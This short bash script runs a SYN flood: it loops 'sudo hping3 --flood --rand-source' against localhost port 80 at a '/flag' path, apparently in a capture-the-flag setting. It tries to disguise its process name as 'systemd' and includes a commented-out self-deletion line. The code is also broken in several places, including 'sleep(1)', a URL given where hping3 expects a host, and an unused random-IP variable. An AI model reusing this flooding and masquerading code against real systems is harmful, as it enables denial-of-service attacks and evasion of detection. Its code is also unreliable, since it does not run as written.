#!/bin/bash

FAKE_IPS=("10.0.0.2" "10.0.0.3" "10.0.0.4" "10.0.0.5" "10.0.0.6")

TARGET="localhost"

prctl --set-name "systemd"

# rm -- "$0"

# cycle through ips randomly
while true; do
    RANDOM_IP=${FAKE_IPS[$RANDOM % ${#FAKE_IPS[@]}]}
    sudo hping3 -S --flood -p 80 --rand-source http://localhost/flag
    sleep(1)
done